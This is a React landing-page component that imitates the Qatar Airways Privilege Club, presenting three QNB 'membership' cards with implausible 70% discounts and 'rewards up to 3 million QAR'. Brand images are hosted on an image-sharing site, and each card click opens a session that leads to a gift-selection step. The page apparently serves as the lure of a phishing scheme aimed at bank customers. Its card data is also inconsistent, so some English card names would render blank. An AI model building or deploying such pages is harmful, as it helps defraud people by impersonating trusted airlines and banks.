import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Check } from "lucide-react";
import Header from "@/components/Header";

const sliderImages = [
  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
];

const cards = [
  { bank: "qnb", nameAr: "العضوية الفضية", nameEn: "Silver Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/GNPJtLJsmUHfUddx.png", bgColor: "#ffffff" },
  { bank: "qnb", nameAr: "العضوية الذهبية", nameEn: "Gold Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/UJpzjPxptKCKuynJ.png", bgColor: "#ffffff" },
  { bank: "qnb", nameAr: "العضوية البلاتينية", en: "Platinum Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/hQqpxtvPQfJHewTY.png", bgColor: "#ffffff" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const { language } = useLanguage();
  const [currentSlide, setCurrentSlide] = useState(0);
  const [userCountry, setUserCountry] = useState("Qatar");
  const [selectedCard, setSelectedCard] = useState<number | null>(null);
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const isArabic = language === "ar";

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  const startSession = async (selectedBank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", selectedBank);
    
    try {
      await createSessionMutation.mutateAsync({
        sessionId,
        selectedBank,
        country: userCountry,
      });
      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
    } catch (err) {
      console.error("Session creation failed:", err);
      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
    }
  };

  const handleCardClick = (idx: number, bank: string) => {
    setSelectedCard(idx);
    setTimeout(() => {
      startSession(bank);
    }, 800);
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
      <Header />
      
      {/* Slider Section */}
      <div style={{ width: '100%', position: 'relative', height: '400px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        {sliderImages.map((image, index) => (
          <img 
            key={index}
            src={image} 
            style={{ 
              width: '100%', 
              height: '100%', 
              objectFit: 'cover', 
              position: 'absolute', 
              top: 0, 
              left: 0, 
              zIndex: 1, 
              transition: 'opacity 1.5s ease-in-out',
              opacity: currentSlide === index ? 1 : 0
            }}
            alt="Privilege Club Banner"
          />
        ))}
        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.3)', zIndex: 2 }}></div>

      </div>

      {/* Reasons Section */}
      <div style={{ maxWidth: '1000px', margin: '-50px auto 30px auto', background: 'white', padding: '30px', borderRadius: '10px', boxShadow: '0 10px 30px rgba(0,0,0,0.1)', position: 'relative', zIndex: 10 }}>
        <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: '#8C0032', marginBottom: '25px', textAlign: 'center' }}>
          {isArabic ? "أسباب رائعة للانضمام إلى نادي الامتياز" : "Great reasons to join Privilege Club"}
        </h2>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '15px 30px' }}>
          {[
            { ar: "عروض حصرية لأعضاء نادي الامتياز", en: "Exclusive member-only offers" },
            { ar: "اربح وأنفق نقاط أفيوس كما تشاء", en: "Earn & spend Avios your way" },
            { ar: "اجمع نقاط أفيوس مع عائلتك", en: "Collect Avios with your family" },
            { ar: "ساعة مجاناً من الإنترنت على متن الطائرة", en: "Complimentary onboard Wi-Fi (1 hour)" },
            { ar: "وفّر عند الدفع باستخدام cash + Avios", en: "Pay with Cash + Avios & save" },
            { ar: "تسوّق وادفع في السوق الحرة القطرية", en: "Shop & Pay at Qatar Duty Free" },
            { ar: "استمتع برحلات المكافآت والترقيات", en: "Enjoy award flights & upgrades" },
            { ar: "احصل على وزن أمتعة إضافي", en: "Get extra baggage allowance" },
            { ar: "استمتع بخدمة الصالات حول العالم*", en: "Access international lounges*" }
          ].map((item, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '16px', color: '#444' }}>
              <Check style={{ color: '#22c55e', flexShrink: 0 }} size={20} />
              <span>{isArabic ? item.ar : item.en}</span>
            </div>
          ))}
        </div>
        <p style={{ fontSize: '12px', color: '#888', marginTop: '20px', borderTop: '1px solid #eee', paddingTop: '15px' }}>
          {isArabic ? "*يسري حصرياً على أعضاء الدرجات الفضية والذهبية والبلاتينية فقط." : "*Exclusive for Silver, Gold and Platinum membership tier."}
        </p>
      </div>

      {/* Features Section */}
      <div style={{ maxWidth: '1000px', margin: '30px auto', padding: '0 20px' }}>
        <h3 style={{ fontSize: '20px', fontWeight: 'bold', color: '#333', marginBottom: '20px', textAlign: 'center' }}>
          {isArabic ? "المميزات الرئيسية للعضوية" : "Main Membership Features"}
        </h3>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '15px', marginBottom: '20px' }}>
          <div style={{ background: 'white', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #eee', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
            <Car style={{ color: '#8C0032' }} />
            <span style={{ fontSize: '13px', fontWeight: '500', color: '#555' }}>{isArabic ? "تأجير السيارات - خصم 70%" : "Car Rental - 70% Discount"}</span>
          </div>
          <div style={{ background: 'white', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #eee', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
            <Hotel style={{ color: '#8C0032' }} />
            <span style={{ fontSize: '13px', fontWeight: '500', color: '#555' }}>{isArabic ? "حجوزات الفنادق - خصم 70%" : "Hotel Booking - 70% Discount"}</span>
          </div>
          <div style={{ background: 'white', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #eee', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
            <Plane style={{ color: '#8C0032' }} />
            <span style={{ fontSize: '13px', fontWeight: '500', color: '#555' }}>{isArabic ? "تذاكر الطيران - خصم 70%" : "Flight Tickets - 70% Discount"}</span>
          </div>
          <div style={{ background: 'white', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #eee', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
            <ParkingCircle style={{ color: '#8C0032' }} />
            <span style={{ fontSize: '13px', fontWeight: '500', color: '#555' }}>{isArabic ? "المواقف - خصم 70%" : "Parking - 70% Discount"}</span>
          </div>
          <div style={{ background: 'white', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #eee', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
            <Gift style={{ color: '#8C0032' }} />
            <span style={{ fontSize: '13px', fontWeight: '500', color: '#555' }}>{isArabic ? "عروض خاصة" : "Special Offers"}</span>
          </div>
          <div style={{ background: 'white', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #eee', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
            <Lock style={{ color: '#8C0032' }} />
            <span style={{ fontSize: '13px', fontWeight: '500', color: '#555' }}>{isArabic ? "دفع آمن" : "Secure Payment"}</span>
          </div>
        </div>
        <div style={{ background: 'linear-gradient(135deg, #8C0032 0%, #c41e5e 100%)', color: 'white', padding: '20px', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '15px', fontWeight: 'bold', fontSize: '16px', boxShadow: '0 4px 15px rgba(140, 0, 50, 0.2)' }}>
          <Trophy size={24} />
          <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3 Million QAR"}</span>
        </div>
      </div>

      {/* Cards Section */}
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '20px', padding: '40px 20px' }}>
        {cards.map((card, idx) => (
          <div 
            key={idx} 
            style={{ 
              backgroundColor: '#ffffff', 
              borderRadius: '20px', 
              padding: '25px', 
              textAlign: 'center', 
              border: selectedCard === idx ? '2px solid #8C0032' : '1px solid #eeeeee', 
              width: '100%', 
              maxWidth: '380px', 
              display: 'flex', 
              flexDirection: 'column', 
              alignItems: 'center', 
              cursor: 'pointer', 
              transition: 'all 0.3s ease', 
              position: 'relative', 
              boxShadow: selectedCard === idx ? '0 8px 25px rgba(140, 0, 50, 0.15)' : '0 4px 15px rgba(0,0,0,0.05)' 
            }}
            onClick={() => handleCardClick(idx, card.bank)}
          >
            {selectedCard === idx && <div style={{ position: 'absolute', top: '-10px', right: '-10px', background: '#8C0032', color: 'white', width: '24px', height: '24px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', boxShadow: '0 2px 5px rgba(0,0,0,0.2)', zIndex: 10 }}>✔</div>}
            <span style={{ fontSize: '20px', fontWeight: 'bold', marginBottom: '15px', color: '#8C0032' }}>{isArabic ? card.nameAr : card.en}</span>
            <img src={card.img} style={{ width: '100%', maxWidth: '300px', marginBottom: '20px' }} alt="Credit Card" />
            <button style={{ backgroundColor: '#8C0032', color: '#ffffff', padding: '12px 40px', border: 'none', borderRadius: '25px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}>
              {isArabic ? "قدم الآن" : "Apply Now"}
            </button>
          </div>
        ))}
      </div>
      
      {/* Footer Image */}
      <div style={{ textAlign: 'center', padding: '40px 20px', backgroundColor: '#ffffff', marginTop: '40px' }}>
        <img 
          src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
          alt="Footer Banner" 
          style={{ maxWidth: '100%', height: 'auto' }} 
        />
      </div>
    </div>
  );
}
